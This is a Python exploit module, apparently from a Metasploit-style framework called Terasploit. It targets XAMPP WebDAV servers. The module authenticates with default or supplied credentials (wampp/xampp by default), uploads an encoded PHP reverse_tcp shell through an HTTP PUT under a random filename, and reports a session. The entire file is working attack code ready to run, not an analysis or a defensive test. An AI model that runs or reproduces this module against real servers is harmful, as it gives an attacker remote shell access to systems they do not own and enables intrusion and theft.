#######
# Module/Exploit: XAMPP WebDav Upload PHP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):

    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Name'     : 'XAMPP WebDav Upload PHP',
                'Module'   : Module.exploit,
                "Platform" : Platform.PHP,
                "Arch"     : Arch.PHP,
                'Payload'  : 'modules/payload/php/reverse_tcp',
                'Authors'  : [
                    'Charlie <rupture6.dev[at]gmail.com>',
                    'Metasploit (c)',
                    'blu0 (c)'
                ],
                'Description' : [
                    'Takes advantage of weak webdav xampp passwords,',
                    'it uses the supplied credentials to exploit the',
                    'target and upload a shell.'
                ],
                'References' : [
                    'https://github.com/blu0/webdav-exploit',
                    'metasploit-framework (windows/http/xampp_webdav_upload_php)'
                ]
            }
        )
        
        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.new('target',['','yes','url of the target']),
            OptString.new('username',['wampp','yes','username to use for authentication']),
            OptString.new('password',['xampp','yes','password to use for authentication']),
            OptProxy.new('proxy',['','no','json file containing proxies, json format {"protocol":"proxy"}']),
            OptBool.new('verify',['true','no','check ssl certificate on the host, set false if proxy cert is self signed']),
            OptString.new('path',['/webdav/','yes','url path to attempt the upload'])
        ])


    def exploit(self) -> tuple[str, bool]:
        payload, _ = Get.payload()
        target, username, password, proxy, verify, path = self.OPT()
        self.ParseURL(target)
        
        shell = self.EncodeShell(payload.generate())
        rand = self.generate_random_name()
        Shell.new(f"{Target.scheme}://{Target.hostname}/{path.rstrip('/').lstrip('/')}/{rand}.php")
        print (Shell.get(),Target.hostname)
        try:
            exploit = HTTPClient.Request('put',
                url=Shell.get(),
                data=shell,
                auth=HTTPDigestAuth(username,password),
                proxies=self.GetProxy(proxy),
                verify=self.GetBoolean(verify)
            )
            
            if exploit.status_code in self.good_status_code():
                info_print (f'Shell uploaded: {Shell.get()}', type="GREEN")
                return 'session', True
            else:
                info_print (f'Exploit failed, status code: {exploit.status_code}',type='red')
                return 'session', False
            
        except Exception as error:
            info_print (error,type='red')
            return 'exception', True